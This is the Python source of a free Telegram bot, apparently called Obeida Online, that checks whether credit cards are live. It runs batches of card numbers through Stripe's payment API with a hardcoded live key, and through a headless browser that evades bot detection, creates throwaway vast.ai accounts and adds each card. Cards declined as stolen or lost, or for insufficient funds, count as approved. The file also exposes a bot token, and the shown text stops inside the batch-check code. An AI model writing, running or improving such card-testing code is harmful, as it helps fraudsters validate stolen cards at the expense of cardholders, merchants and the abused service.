#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Obeida Online - Free Multi Gateway CC Checker Bot
Version: 22.0 - Enhanced Real Check Gateway with Stripe API Monitoring
Author: @ObeidaOnline
Channel: https://t.me/ObeidaTrading
"""

# ==================== التحقق من إصدار Python ====================
import sys
import platform

print(f"📌 إصدار Python: {sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}")
print(f"📌 نظام التشغيل: {platform.system()} {platform.release()}")

# ==================== المكتبات المطلوبة ====================
import time
import json
import random
import string
import re
import os
import threading
import asyncio
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Optional, Any
import http.server
import socketserver
import shutil
import warnings

# استيراد المكتبات الخارجية
try:
    import requests
    import aiohttp
    from fake_useragent import UserAgent
    from faker import Faker
    from colorama import init, Fore, Style
    import telebot
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    from playwright.async_api import async_playwright
except ImportError as e:
    print(f"❌ خطأ في استيراد المكتبات: {e}")
    sys.exit(1)

# تجاهل التحذيرات
warnings.filterwarnings("ignore")

# تهيئة الألوان
init(autoreset=True)

# ==================== إعدادات البوت ====================
BOT_TOKEN = "8375573526:AAFa882xWsLWl6LAfl0IcaZEU12hyP6YIy0"
ADMIN_IDS = [6207431030]
CHANNEL_USERNAME = "@ObeidaTrading"
DEV_CONTACT = "@Sz2zv"
BOT_USERNAME = "ObeidaOnlineBot"

CHANNEL_LINK = "https://t.me/ObeidaTrading"
SUPPORT_LINK = "https://t.me/Sz2zv"

# مجلدات التخزين
DATA_FOLDER = "data"
BACKUP_FOLDER = "backups"
TEMP_FOLDER = "temp"

os.makedirs(DATA_FOLDER, exist_ok=True)
os.makedirs(BACKUP_FOLDER, exist_ok=True)
os.makedirs(TEMP_FOLDER, exist_ok=True)

# ملفات التخزين
USERS_FILE = os.path.join(DATA_FOLDER, "users.json")
APPROVED_CARDS_FILE = os.path.join(DATA_FOLDER, "approved.txt")
DECLINED_CARDS_FILE = os.path.join(DATA_FOLDER, "declined.txt")
STATS_FILE = os.path.join(DATA_FOLDER, "stats.json")
SETTINGS_FILE = os.path.join(DATA_FOLDER, "settings.json")
GROUPS_FILE = os.path.join(DATA_FOLDER, "groups.json")

# ==================== إعدادات البوابات ====================
GATES = {
    "stripe": {
        "name": "💳 Stripe Gateway",
        "command": "st",
        "mass_command": "mass",
        "icon": "💳",
        "default": True
    },
    "real": {
        "name": "✅ Real Check",
        "command": "chk",
        "mass_command": "chkm",
        "icon": "✅",
        "default": False
    }
}

# ==================== تهيئة البوت ====================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
fake = Faker()
ua = UserAgent()

# متغيرات عامة
user_last_file = {}
user_active_checks = {}
active_checks_lock = threading.Lock()

# ==================== إدارة البيانات ====================
class DataManager:
    
    @staticmethod
    def init_files():
        if not os.path.exists(USERS_FILE):
            users = {}
            for admin_id in ADMIN_IDS:
                users[str(admin_id)] = {
                    "user_id": admin_id,
                    "username": "admin",
                    "first_name": "Admin",
                    "joined_date": datetime.now().isoformat(),
                    "is_admin": True,
                    "usage": {"total_checks": 0, "approved": 0, "declined": 0},
                    "default_gate": "stripe"
                }
            DataManager.save_json(USERS_FILE, users)
        
        if not os.path.exists(STATS_FILE):
            DataManager.save_json(STATS_FILE, {
                "total_checks": 0,
                "total_approved": 0,
                "total_declined": 0,
                "gates_usage": {},
                "daily_stats": {},
                "last_backup": None
            })
        
        if not os.path.exists(SETTINGS_FILE):
            DataManager.save_json(SETTINGS_FILE, {
                "auto_backup": True,
                "auto_clean": True,
                "clean_days": 30,
                "maintenance_mode": False,
                "default_check_gate": "stripe",
                "delay_between_cards": 3
            })
        
        if not os.path.exists(GROUPS_FILE):
            DataManager.save_json(GROUPS_FILE, {
                "allowed_groups": [],
                "blocked_groups": [],
                "group_settings": {}
            })
        
        for file in [APPROVED_CARDS_FILE, DECLINED_CARDS_FILE]:
            if not os.path.exists(file):
                with open(file, 'w', encoding='utf-8') as f:
                    f.write(f"# {'Approved' if 'approved' in file else 'Declined'} Cards\n")
    
    @staticmethod
    def load_json(file_path: str, default: Any = None) -> Any:
        try:
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    return json.load(f)
            return default if default is not None else {}
        except Exception:
            return default if default is not None else {}
    
    @staticmethod
    def save_json(file_path: str, data: Any) -> bool:
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4, ensure_ascii=False)
            return True
        except Exception as e:
            print(f"❌ خطأ: {e}")
            return False
    
    @staticmethod
    def load_users() -> Dict:
        DataManager.init_files()
        users = DataManager.load_json(USERS_FILE, {})
        for uid, user in users.items():
            if "usage" not in user:
                user["usage"] = {"total_checks": 0, "approved": 0, "declined": 0}
            if "default_gate" not in user:
                user["default_gate"] = "stripe"
        return users
    
    @staticmethod
    def save_users(users: Dict) -> bool:
        return DataManager.save_json(USERS_FILE, users)
    
    @staticmethod
    def load_stats() -> Dict:
        stats = DataManager.load_json(STATS_FILE, {})
        defaults = {
            "total_checks": 0, "total_approved": 0, "total_declined": 0,
            "gates_usage": {}, "daily_stats": {}, "last_backup": None
        }
        for key, value in defaults.items():
            if key not in stats:
                stats[key] = value
        return stats
    
    @staticmethod
    def save_stats(stats: Dict) -> bool:
        return DataManager.save_json(STATS_FILE, stats)
    
    @staticmethod
    def load_settings() -> Dict:
        settings = DataManager.load_json(SETTINGS_FILE, {
            "auto_backup": True, "auto_clean": True, "clean_days": 30,
            "maintenance_mode": False, "default_check_gate": "stripe", "delay_between_cards": 3
        })
        return settings
    
    @staticmethod
    def save_settings(settings: Dict) -> bool:
        return DataManager.save_json(SETTINGS_FILE, settings)
    
    @staticmethod
    def save_card_result(card: str, gate: str, response: str, user_id: int, is_approved: bool):
        try:
            file_path = APPROVED_CARDS_FILE if is_approved else DECLINED_CARDS_FILE
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {gate} | User:{user_id} | {card} | {response}\n")
        except:
            pass
    
    @staticmethod
    def check_access(user_id: int, chat_id: int = None) -> bool:
        if user_id in ADMIN_IDS:
            return True
        settings = DataManager.load_settings()
        if settings.get("maintenance_mode", False):
            return False
        return True
    
    @staticmethod
    def get_user_default_gate(user_id: int) -> str:
        users = DataManager.load_users()
        return users.get(str(user_id), {}).get("default_gate", "stripe")
    
    @staticmethod
    def set_user_default_gate(user_id: int, gate: str) -> bool:
        if gate not in GATES:
            return False
        users = DataManager.load_users()
        uid = str(user_id)
        if uid not in users:
            users[uid] = {"user_id": user_id, "joined_date": datetime.now().isoformat(), "usage": {"total_checks": 0, "approved": 0, "declined": 0}}
        users[uid]["default_gate"] = gate
        return DataManager.save_users(users)
    
    @staticmethod
    def update_usage(user_id: int, gate: str, result: str):
        users = DataManager.load_users()
        stats = DataManager.load_stats()
        uid = str(user_id)
        if uid not in users:
            users[uid] = {"user_id": user_id, "joined_date": datetime.now().isoformat(), "usage": {"total_checks": 0, "approved": 0, "declined": 0}}
        
        is_approved = "✅" in result or "مقبولة" in result
        usage = users[uid]["usage"]
        usage["total_checks"] += 1
        
        if is_approved:
            usage["approved"] += 1
            stats["total_approved"] = stats.get("total_approved", 0) + 1
        else:
            usage["declined"] += 1
            stats["total_declined"] = stats.get("total_declined", 0) + 1
        
        stats["total_checks"] = stats.get("total_checks", 0) + 1
        stats["gates_usage"][gate] = stats["gates_usage"].get(gate, 0) + 1
        
        today = datetime.now().strftime("%Y-%m-%d")
        if today not in stats["daily_stats"]:
            stats["daily_stats"][today] = {"checks": 0, "approved": 0}
        stats["daily_stats"][today]["checks"] += 1
        if is_approved:
            stats["daily_stats"][today]["approved"] += 1
        
        DataManager.save_users(users)
        DataManager.save_stats(stats)

# ==================== أدوات مساعدة ====================
class Helpers:
    @staticmethod
    def parse_card(card_str: str) -> Optional[Dict]:
        try:
            card_str = re.sub(r'[;:,\s/]+', '|', card_str.strip())
            if '|' in card_str:
                parts = card_str.split('|')
                if len(parts) >= 4:
                    number = re.sub(r'\D', '', parts[0])
                    month = re.sub(r'\D', '', parts[1])
                    year = re.sub(r'\D', '', parts[2])
                    cvv = re.sub(r'\D', '', parts[3])
                    
                    if len(number) >= 15 and len(number) <= 19:
                        if len(month) == 1:
                            month = f"0{month}"
                        if len(year) == 4:
                            year = year[-2:]
                        if len(cvv) >= 3 and len(cvv) <= 4:
                            return {
                                'number': number, 'month': month, 'year': year, 'cvv': cvv,
                                'original': card_str, 'name': parts[4] if len(parts) > 4 else "Card Holder"
                            }
            return None
        except:
            return None
    
    @staticmethod
    def extract_cards_from_text(text: str) -> List[Dict]:
        cards = []
        for line in text.strip().split('\n'):
            line = line.strip()
            if line and not line.startswith('#'):
                card = Helpers.parse_card(line)
                if card:
                    cards.append(card)
        return cards
    
    @staticmethod
    def luhn_check(card_number: str) -> bool:
        try:
            card_number = re.sub(r'[\s-]', '', card_number)
            if not card_number.isdigit() or len(card_number) < 13 or len(card_number) > 19:
                return False
            digits = [int(d) for d in card_number]
            checksum = 0
            for i, digit in enumerate(reversed(digits)):
                if i % 2 == 1:
                    digit *= 2
                    if digit > 9:
                        digit -= 9
                checksum += digit
            return checksum % 10 == 0
        except:
            return False
    
    @staticmethod
    def get_bin_info(bin_num: str) -> Dict:
        try:
            r = requests.get(f"https://lookup.binlist.net/{bin_num[:6]}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                return {
                    "brand": data.get('scheme', 'Unknown').upper(),
                    "bank": data.get('bank', {}).get('name', 'Unknown'),
                    "country": data.get('country', {}).get('name', 'Unknown'),
                    "flag": data.get('country', {}).get('emoji', '🏁')
                }
        except:
            pass
        return {"brand": "Unknown", "bank": "Unknown", "country": "Unknown", "flag": "🏁"}
    
    @staticmethod
    def get_chat_type(chat_id: int) -> str:
        return "private" if chat_id > 0 else "group"

# ==================== تنسيق النتائج ====================
class ResultFormatter:
    @staticmethod
    def format_single_result(card: str, result: str, is_approved: bool, gate_name: str, bin_info: Dict = None) -> str:
        number = card.split('|')[0] if '|' in card else card
        masked = f"{number[:6]}xxxxxx{number[-4:]}"
        status = "✅ LIVE - CARD APPROVED" if is_approved else "❌ DECLINED"
        
        bin_text = f"\n𒊹︎︎︎ 𝗕𝗜𝗡 ⌁ {number[:6]}\n𒊹︎︎︎ 𝗕𝗥𝗔𝗡𝗗 ⌁ {bin_info.get('brand', 'Unknown')}\n𒊹︎︎︎ 𝗕𝗔𝗡𝗞 ⌁ {bin_info.get('bank', 'Unknown')}\n𒊹︎︎︎ 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ⌁ {bin_info.get('country', 'Unknown')} {bin_info.get('flag', '🏁')}" if bin_info else ""
        
        return f"""
🚀 {gate_name} 🚀
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌

𒊹︎︎︎ 𝗖𝗖 ⌁ {masked}
𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ {status}
{bin_text}
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
🆔 Obeida Online | @ObeidaTrading
"""

# ==================== بوابة Stripe ====================
class StripeGateway:
    async def process_card(self, card_data: Dict) -> Tuple[bool, str]:
        try:
            timeout = aiohttp.ClientTimeout(total=60)
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                random_ua = ua.random
                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
                stripe_headers = {
                    'accept': 'application/json',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'user-agent': random_ua
                }
                stripe_data = {
                    'type': 'card',
                    'card[number]': card_data['number'],
                    'card[cvc]': card_data['cvv'],
                    'card[exp_month]': card_data['month'],
                    'card[exp_year]': card_data['year'],
                    'billing_details[address][country]': 'US',
                    'key': stripe_key
                }
                pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
                pm_json = await pm_resp.json()
                
                if 'error' in pm_json:
                    err = pm_json['error']
                    code = err.get('decline_code', '')
                    if code in ['incorrect_cvc', 'invalid_cvc']:
                        return True, "💳 CVV ERROR"
                    elif code == 'insufficient_funds':
                        return True, "💰 INSUFFICIENT FUNDS"
                    return False, f"❌ DECLINED"
                return True, "✅ APPROVED"
        except Exception as e:
            return False, f"⚠️ خطأ"

# ==================== بوابة Real Check (معدلة مع مراقبة Stripe API) ====================
class RealCheckGateway:
    
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        ]
        self.viewports = [
            {'width': 891, 'height': 1711},
            {'width': 393, 'height': 852},
            {'width': 390, 'height': 844},
        ]
    
    def generate_random_email(self) -> str:
        return f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}@gmail.com"
    
    async def type_like_human(self, page, selector: str, text: str):
        await page.locator(selector).click()
        await asyncio.sleep(random.uniform(0.1, 0.3))
        for char in text:
            await page.locator(selector).type(char, delay=random.uniform(0.08, 0.15))
            await asyncio.sleep(random.uniform(0.02, 0.05))
    
    async def type_card_number(self, page, card_number: str):
        await page.locator("#cardNumber").click()
        await asyncio.sleep(random.uniform(0.2, 0.4))
        for i in range(0, len(card_number), 4):
            group = card_number[i:i+4]
            for char in group:
                await page.locator("#cardNumber").type(char, delay=random.uniform(0.08, 0.15))
            await asyncio.sleep(random.uniform(0.1, 0.25))
    
    async def check_card(self, card_data: Dict) -> Tuple[bool, str]:
        random_ua = random.choice(self.user_agents)
        random_viewport = random.choice(self.viewports)
        
        # متغيرات لتخزين نتيجة الفحص
        check_result = {"approved": None, "message": None}
        check_complete = threading.Event()
        
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                context = await browser.new_context(
                    viewport=random_viewport,
                    user_agent=random_ua
                )
                
                await context.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
                    Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
                    window.chrome = { runtime: {} };
                """)
                
                page = await context.new_page()
                email = self.generate_random_email()
                password = "Obeida059@"
                name = card_data.get('name', 'Card Holder')
                
                # مراقبة ردود Stripe API
                async def handle_response(response):
                    try:
                        url = response.url()
                        
                        # التركيز على ردود Stripe المهمة
                        if 'api.stripe.com' in url and ('payment_intents' in url or 'payment_methods' in url or 'confirm' in url):
                            try:
                                data = await response.json()
                                
                                # ✅ نجاح البطاقة
                                if data.get('status') == 'succeeded':
                                    check_result["approved"] = True
                                    check_result["message"] = "✅ البطاقة مقبولة"
                                    check_complete.set()
                                    return
                                
                                # ❌ رفض البطاقة مع تحليل السبب
                                if data.get('last_payment_error'):
                                    error = data.get('last_payment_error')
                                    error_code = error.get('code', '')
                                    error_message = error.get('message', '').lower()
                                    
                                    # CVV خطأ (بطاقة حية)
                                    if 'cvv' in error_message or 'security' in error_message or error_code == 'incorrect_cvc':
                                        check_result["approved"] = True
                                        check_result["message"] = "✅ البطاقة مقبولة"
                                        check_complete.set()
                                        return
                                    
                                    # رصيد غير كافي (بطاقة حية)
                                    elif 'insufficient' in error_message or error_code == 'insufficient_funds':
                                        check_result["approved"] = True
                                        check_result["message"] = "✅ البطاقة مقبولة"
                                        check_complete.set()
                                        return
                                    
                                    # بطاقة مسروقة أو مفقودة (بطاقة حية)
                                    elif 'stolen' in error_message or 'lost' in error_message:
                                        check_result["approved"] = True
                                        check_result["message"] = "✅ البطاقة مقبولة"
                                        check_complete.set()
                                        return
                                    
                                    # رفض عادي
                                    else:
                                        check_result["approved"] = False
                                        check_result["message"] = "❌ البطاقة مرفوضة"
                                        check_complete.set()
                                        return
                                
                                # خطأ في إنشاء payment method
                                if data.get('error'):
                                    error = data.get('error')
                                    error_code = error.get('code', '')
                                    error_message = error.get('message', '').lower()
                                    
                                    if 'cvv' in error_message or 'security' in error_message:
                                        check_result["approved"] = True
                                        check_result["message"] = "✅ البطاقة مقبولة"
                                        check_complete.set()
                                        return
                                    elif 'insufficient' in error_message:
                                        check_result["approved"] = True
                                        check_result["message"] = "✅ البطاقة مقبولة"
                                        check_complete.set()
                                        return
                                    else:
                                        check_result["approved"] = False
                                        check_result["message"] = "❌ البطاقة مرفوضة"
                                        check_complete.set()
                                        return
                                        
                            except:
                                pass
                                
                    except Exception as e:
                        pass
                
                page.on('response', handle_response)
                
                await page.goto("https://cloud.vast.ai/create/", timeout=30000)
                await asyncio.sleep(random.uniform(1.5, 2.5))
                
                await page.locator('[data-testid="vast-main-login-button"]').click()
                await asyncio.sleep(random.uniform(1, 1.5))
                
                await self.type_like_human(page, '#\\:r12\\:', email)
                await asyncio.sleep(random.uniform(0.5, 1))
                await self.type_like_human(page, '#\\:r14\\:', password)
                await asyncio.sleep(random.uniform(0.3, 0.6))
                await self.type_like_human(page, '#\\:r15\\:', password)
                await asyncio.sleep(random.uniform(0.3, 0.6))
                
                await page.locator('div.MuiDialog-root label:nth-of-type(1) input').click()
                await asyncio.sleep(random.uniform(0.3, 0.6))
                
                await page.locator('[data-testid="auth-submit-login-signup"]').click()
                await asyncio.sleep(random.uniform(3, 4))
                
                await page.locator('div:nth-of-type(2) > li:nth-of-type(1) span.vast-typography').click()
                await asyncio.sleep(random.uniform(2, 3))
                
                await page.locator('[data-testid="billing-page-payment-methods-add-card-button"]').click()
                await asyncio.sleep(random.uniform(4, 6))
                
                expiry = f"{card_data['month']}/{card_data['year']}"
                
                await self.type_card_number(page, card_data['number'])
                await asyncio.sleep(random.uniform(0.3, 0.6))
                
                await self.type_like_human(page, "#cardExpiry", expiry)
                await asyncio.sleep(random.uniform(0.2, 0.4))
                
                await self.type_like_human(page, "#cardCvc", card_data['cvv'])
                await asyncio.sleep(random.uniform(0.2, 0.4))
                
                await self.type_like_human(page, "#billingName", name)
                await asyncio.sleep(random.uniform(0.2, 0.4))
                
                await page.locator("#billingCountry").click()
                await asyncio.sleep(random.uniform(0.1, 0.3))
                await self.type_like_human(page, "#billingCountry", "US")
                await asyncio.sleep(random.uniform(0.1, 0.3))
                
                await self.type_like_human(page, "#billingPostalCode", "90003")
                await asyncio.sleep(random.uniform(0.3, 0.6))
                
                # الضغط على زر الإضافة
                await page.locator('div.SubmitButton-IconContainer').click()
                
                # انتظار النتيجة من Stripe
                await asyncio.sleep(2)
                
                # انتظار اكتمال الفحص (حد أقصى 20 ثانية)
                try:
                    await asyncio.wait_for(check_complete.wait(), timeout=20)
                except:
                    pass
                
                # الحصول على الصفحة الحالية للتحقق الإضافي
                current_url = page.url
                page_content = await page.content()
                
                await browser.close()
                
                # إذا تم الحصول على نتيجة من Stripe
                if check_result["approved"] is not None:
                    return check_result["approved"], check_result["message"]
                
                # تحليل إضافي من URL ومحتوى الصفحة
                combined_text = (current_url + " " + page_content).lower()
                
                # كلمات النجاح
                success_keywords = [
                    'billing?session_id=', 'payment method added', 'successfully added',
                    'card added', 'payment method saved', 'setup succeeded',
                    'thank you', 'confirmation', 'completed'
                ]
                
                for keyword in success_keywords:
                    if keyword in combined_text:
                        return True, "✅ البطاقة مقبولة"
                
                if 'billing?session_id=' in current_url:
                    return True, "✅ البطاقة مقبولة"
                
                if 'payment-methods' in current_url and 'billing' in current_url:
                    return True, "✅ البطاقة مقبولة"
                
                if 'stripe.com' in current_url:
                    if 'cvv' in combined_text or 'security' in combined_text:
                        return True, "✅ البطاقة مقبولة"
                    if 'insufficient' in combined_text:
                        return True, "✅ البطاقة مقبولة"
                
                return False, "❌ البطاقة مرفوضة"
                        
        except Exception as e:
            print(f"⚠️ خطأ: {e}")
            return False, "❌ البطاقة مرفوضة"

# ==================== بوابات الفحص ====================
class RealGateways:
    def __init__(self):
        self.stripe = StripeGateway()
        self.real = RealCheckGateway()
    
    async def check_card(self, gate: str, card: Dict) -> Tuple[bool, str]:
        if gate == 'stripe':
            return await self.stripe.process_card(card)
        elif gate == 'real':
            return await self.real.check_card(card)
        return False, "❌ بوابة غير مدعومة"

# ==================== واجهة المستخدم ====================
class UserInterface:
    @staticmethod
    def main_buttons():
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("⛔ إيقاف الفحص", callback_data="stop_check"),
            InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK),
            InlineKeyboardButton("👨‍💻 المطور", url=SUPPORT_LINK)
        )
        return markup
    
    @staticmethod
    def stop_button():
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⛔ إيقاف الفحص", callback_data="stop_check"))
        return markup

# ==================== معالج الأوامر ====================
class CommandHandler:
    def __init__(self):
        self.gateways = RealGateways()
        self.ui = UserInterface()
        self.user_last_file = user_last_file
    
    def check_access(self, message) -> bool:
        return DataManager.check_access(message.from_user.id, message.chat.id)
    
    def save_last_file(self, user_id: int, file_id: str, file_name: str, content: str):
        self.user_last_file[user_id] = {"file_id": file_id, "file_name": file_name, "content": content, "timestamp": datetime.now().isoformat()}
    
    def get_last_file(self, user_id: int) -> Optional[Dict]:
        return self.user_last_file.get(user_id)
    
    def is_user_checking(self, user_id: int) -> bool:
        with active_checks_lock:
            return user_id in user_active_checks
    
    def set_user_checking(self, user_id: int, check_id: str):
        with active_checks_lock:
            user_active_checks[user_id] = check_id
    
    def clear_user_checking(self, user_id: int):
        with active_checks_lock:
            if user_id in user_active_checks:
                del user_active_checks[user_id]
    
    def handle_start(self, message):
        user = message.from_user
        users = DataManager.load_users()
        if str(user.id) not in users:
            users[str(user.id)] = {"user_id": user.id, "username": user.username, "first_name": user.first_name, "joined_date": datetime.now().isoformat(), "is_admin": user.id in ADMIN_IDS, "usage": {"total_checks": 0, "approved": 0, "declined": 0}, "default_gate": "stripe"}
            DataManager.save_users(users)
        
        default_gate = DataManager.get_user_default_gate(user.id)
        default_gate_name = GATES.get(default_gate, {}).get("name", "Stripe")
        
        welcome = f"""
✨ <b>مرحباً بك في بوت Obeida Online</b> ✨

<b>🚪 البوابة الافتراضية:</b> {default_gate_name}
<b>💡 البوت مجاني بالكامل للجميع!</b>

<b>📝 البوابات المتاحة:</b>
💳 Stripe - فحص سريع
✅ Real Check - فحص حقيقي

<b>📝 الأوامر:</b>
/st [البطاقة] - فحص عبر Stripe
/chk [البطاقة] - فحص عبر Real Check
/mass [ملف] - فحص ملف عبر Stripe
/chkm [ملف] - فحص ملف عبر Real Check
/stop - إيقاف الفحص
/profile - عرض إحصائياتك
/stats - إحصائيات البوت
/default [stripe/real] - تغيير البوابة
/lastfile - فحص آخر ملف

<b>📢 القناة:</b> {CHANNEL_USERNAME}
<b>👨‍💻 المطور:</b> {DEV_CONTACT}
"""
        bot.send_message(message.chat.id, welcome, parse_mode='HTML', reply_markup=self.ui.main_buttons())
    
    def handle_stop(self, message):
        user_id = message.from_user.id
        with active_checks_lock:
            if user_id in user_active_checks:
                del user_active_checks[user_id]
                bot.reply_to(message, "⛔ <b>تم إيقاف الفحص</b>", parse_mode='HTML')
            else:
                bot.reply_to(message, "ℹ️ <b>لا يوجد فحص نشط</b>", parse_mode='HTML')
    
    def handle_profile(self, message):
        user_id = message.from_user.id
        users = DataManager.load_users()
        data = users.get(str(user_id), {})
        usage = data.get('usage', {})
        default_gate = data.get('default_gate', 'stripe')
        total = usage.get('total_checks', 0)
        approved = usage.get('approved', 0)
        
        profile = f"""
👤 <b>الملف الشخصي</b>
━━━━━━━━━━━━
<b>🆔 المعرف:</b> <code>{user_id}</code>
<b>🚪 البوابة:</b> {GATES.get(default_gate, {}).get('name', 'Stripe')}
<b>📊 الإحصائيات:</b>
• إجمالي: {total}
• ✅ المقبولة: {approved}
• 📈 النجاح: {(approved/total*100) if total > 0 else 0:.1f}%
━━━━━━━━━━━━
🆔 Obeida Online
"""
        bot.reply_to(message, profile, parse_mode='HTML')
    
    def handle_stats(self, message):
        stats = DataManager.load_stats()
        total = stats.get('total_checks', 0)
        approved = stats.get('total_approved', 0)
        
        text = f"""
📊 <b>إحصائيات البوت</b>
━━━━━━━━━━━━
📈 <b>الإجمالي:</b> {total} فحص
✅ المقبولة: {approved}
📊 النجاح: {(approved/total*100) if total > 0 else 0:.1f}%
━━━━━━━━━━━━
🆔 Obeida Online
"""
        bot.reply_to(message, text, parse_mode='HTML')
    
    def handle_default_gate(self, message):
        parts = message.text.strip().split()
        if len(parts) < 2:
            current = DataManager.get_user_default_gate(message.from_user.id)
            bot.reply_to(message, f"⚙️ البوابة الحالية: {GATES[current]['name']}\nللتغيير: <code>/default stripe</code> أو <code>/default real</code>", parse_mode='HTML')
            return
        
        gate = parts[1].lower()
        if gate not in GATES:
            bot.reply_to(message, "❌ بوابة غير موجودة", parse_mode='HTML')
            return
        
        if DataManager.set_user_default_gate(message.from_user.id, gate):
            bot.reply_to(message, f"✅ تم تعيين {GATES[gate]['name']}", parse_mode='HTML')
    
    def check_single_card(self, message, card: Dict, gate: str):
        user_id = message.from_user.id
        gate_name = GATES[gate]['name']
        masked_card = f"{card['number'][:6]}xxxxxx{card['number'][-4:]}"
        
        if self.is_user_checking(user_id):
            bot.reply_to(message, "⚠️ <b>لديك فحص نشط</b>\nاستخدم /stop للإيقاف", parse_mode='HTML')
            return
        
        check_id = str(int(time.time() * 1000))
        self.set_user_checking(user_id, check_id)
        
        def run_check():
            try:
                self._run_single_check(message, card, gate, gate_name, masked_card, user_id, check_id)
            finally:
                self.clear_user_checking(user_id)
        
        threading.Thread(target=run_check, daemon=True).start()
    
    def _run_single_check(self, message, card, gate, gate_name, masked_card, user_id, check_id):
        try:
            progress_msg = bot.reply_to(message, f"""
🚀 جاري الفحص 🚀
⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌

𒊹︎︎︎ 𝗖𝗖 ⌁ {masked_card}
𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ جاري التحقق ...
""", parse_mode='HTML', reply_markup=self.ui.stop_button())
            
            message_id = progress_msg.message_id
            chat_id = progress_msg.chat.id
            
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            approved, resp = loop.run_until_complete(self.gateways.check_card(gate, card))
            loop.close()
            
            if not self.is_user_checking(user_id) or user_active_checks.get(user_id) != check_id:
                bot.edit_message_text("⛔ تم إيقاف الفحص", chat_id, message_id, parse_mode='HTML')
                return
            
            DataManager.update_usage(user_id, gate, resp)
            DataManager.save_card_result(card['original'], gate_name, resp, user_id, approved)
            bin_info = Helpers.get_bin_info(card['number'][:6])
            final_result = ResultFormatter.format_single_result(card['original'], resp, approved, gate_name, bin_info)
            bot.edit_message_text(final_result, chat_id, message_id, parse_mode='HTML')
            
        except Exception as e:
            print(f"Error: {e}")
    
    def check_multiple_cards(self, message, cards: List[Dict], gate: str):
        user_id = message.from_user.id
        gate_name = GATES[gate]['name']
        
        if self.is_user_checking(user_id):
            bot.reply_to(message, "⚠️ <b>لديك فحص نشط</b>\nاستخدم /stop للإيقاف", parse_mode='HTML')
            return
        
        check_id = str(int(time.time() * 1000))
        self.set_user_checking(user_id, check_id)
        
        def run_mass():
            try:
                self._run_mass_check(message, cards, gate, gate_name, user_id, check_id)
            finally:
                self.clear_user_checking(user_id)
        
        threading.Thread(target=run_mass, daemon=True).start()
    
    def _run_mass_check(self, message, cards, gate, gate_name, user_id, check_id):
        try:
            total = len(cards)
            delay = DataManager.load_settings().get("delay_between_cards", 3)
            
            start_msg = bot.reply_to(message, f"""
🚀 بدء الفحص 🚀
━━━━━━━━━━━━
📊 البطاقات: {total}
🚪 البوابة: {gate_name}
━━━━━━━━━━━━
✅ المقبولة: 0
❌ المرفوضة: 0
